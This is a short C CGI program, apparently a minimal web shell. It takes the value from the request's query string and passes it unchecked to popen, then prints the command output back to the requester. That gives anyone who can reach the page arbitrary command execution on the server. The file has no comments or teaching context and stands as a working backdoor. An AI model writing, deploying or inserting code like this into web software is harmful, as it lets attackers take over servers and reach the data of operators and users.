#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int executeCommand(char *command);
char* replace_char(char* str, char find, char replace);

int main(){
	char *data;
	data = getenv("QUERY_STRING");
	data = replace_char(data,'+',' ');
	char *command = strtok(data,"="); 
	command = strtok(NULL,"\n");
	executeCommand(command);
	return 0;
}

int executeCommand(char *command){
    FILE *pf;
    char data[200];

    pf = popen(command, "r");

    while (fgets(data, 200, pf) != NULL){
	 printf("%s", data);
         memset(data, '\0', 200);
    }
    if (pclose(pf) != 0){
        printf("no se pudo ejecutar la instruccion\n");
    }
    return 0;
}

char* replace_char(char* str, char find, char replace){
    char *current_pos = strchr(str,find);
    while (current_pos){
        *current_pos = replace;
        current_pos = strchr(current_pos,find);
    }
    return str;
}
